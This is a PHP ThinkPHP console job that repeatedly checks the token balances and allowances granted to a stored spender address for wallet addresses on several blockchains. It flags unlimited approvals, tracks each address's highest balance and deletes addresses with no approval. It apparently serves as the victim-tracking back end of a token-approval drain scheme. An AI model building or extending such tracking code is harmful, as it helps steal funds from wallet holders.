<?php
/**
 * 自动更新线上余额及授权数量
 */
namespace app\command;
use think\console\Command;
use think\console\Input;
use think\console\Output;
use think\Db;
use think\Exception;

class AutoUpdateOnlineMoney extends Command
{

    protected function configure()
    {
        $this->setName('AutoUpdateOnlineMoney')
            ->setDescription('自动更新线上余额及授权数量');
    }
    public function execute(Input $input, Output $output)
    {
        ini_set('max_execution_time',0);
        $output->writeln('----- '.date('y-m-d H:i:s').' 当前正在执行更新任务 -----');
        $page = 1 ;
        while (true) {
            $dayf2 = strtotime('-1 days');
            $map['createtime']=['>=',$dayf2];
            $or_map['money_approve']=['>',0];
            $todo_list = Db('address')
                ->where(function ($query) use ($map) {
                    $query->where($map);
                })
                ->whereOr(function ($query) use ($or_map) {
                    $query->where($or_map);
                })
                ->order('updatetime','asc')
                ->page($page,10)
//                ->fetchSql()
                ->select();
            if(empty($todo_list)){
                $page = 0;
                $output->writeln('当前没有任务....');
            }else{
                foreach ($todo_list as $vo) {
                    try {
                        try {
                            switch ($vo['chain']){
                                case 'trc':
                                    $qb_type = 1;
                                    break;
                                case 'bsc':
                                    $qb_type = 2;
                                    break;
                                case 'eth':
                                    $qb_type = 3;
                                    break;
                                case 'okt':
                                    $qb_type = 4;
                                    break;
                            }
                            $money_online = (new \app\common\service\Getbalance())->getTokenBalance($qb_type,$vo['address'],$vo['contract_address'],$vo['approve_address_decimals']);
                            $money_approve = (new \app\common\service\Getbalance())->getTokenApprove($qb_type,$vo['address'],$vo['approve_address'],$vo['contract_address'],$vo['approve_address_decimals']);
                            $max_money = db('address')->where(['id'=>$vo['id']])->value('max_money');
                            if($money_approve >= 115792089237316195423570985008687907853269984665640564039457584007913129.639936){
                                if($max_money < $money_online){
                                    db('address')->where(['id'=>$vo['id']])->update(['updatetime'=>time(),'money_approve'=>10000000000,'money_online'=>$money_online,'max_money'=>$money_online,'is_approve'=>1,'is_approve_old'=>1]);
                                }else{
                                    db('address')->where(['id'=>$vo['id']])->update(['updatetime'=>time(),'money_approve'=>10000000000,'money_online'=>$money_online,'is_approve'=>1,'is_approve_old'=>1]);
                                }
                            }else{
                                if($money_approve  > 0){
                                    if($money_approve > 10000000000){
                                        $money_approve = 10000000000;
                                    }
                                    if($max_money < $money_online){
                                        db('address')->where(['id'=>$vo['id']])->update(['updatetime'=>time(),'money_approve'=> $money_approve,'max_money'=>$money_online,'money_online'=>$money_online,'is_approve'=>1,'is_approve_old'=>1]);
                                    }else{
                                        db('address')->where(['id'=>$vo['id']])->update(['updatetime'=>time(),'money_approve'=> $money_approve,'money_online'=>$money_online,'is_approve'=>1,'is_approve_old'=>1]);
                                    }
                                }else{
                                    db('address')->where(['id'=>$vo['id']])->delete();
                                }
                            }

                            $output->writeln('----- ' . date('y-m-d H:i:s') . ' 地址'.$vo['address'].',在线余额:'.$money_online.'U,授权数量:'.$money_approve.'U-----');
                        } catch (Exception $e) {
                            $output->writeln( $vo['address'].'执行失败：' . $e->getMessage());
                        }
                    } catch (\Exception $e) {
                        $output->writeln($vo['id'].','.$vo['address'] . '执行失败：' . $e->getMessage());
                    }
                }
                $output->writeln('----- ' . date('y-m-d H:i:s') . ' 第'.$page.'页任务处理完成 -----');
            }
            sleep(1);
            $page++;
            $output->writeln('----- ' . date('y-m-d H:i:s') . ' 进行第'.$page.'页任务处理 -----');
        }
    }
}
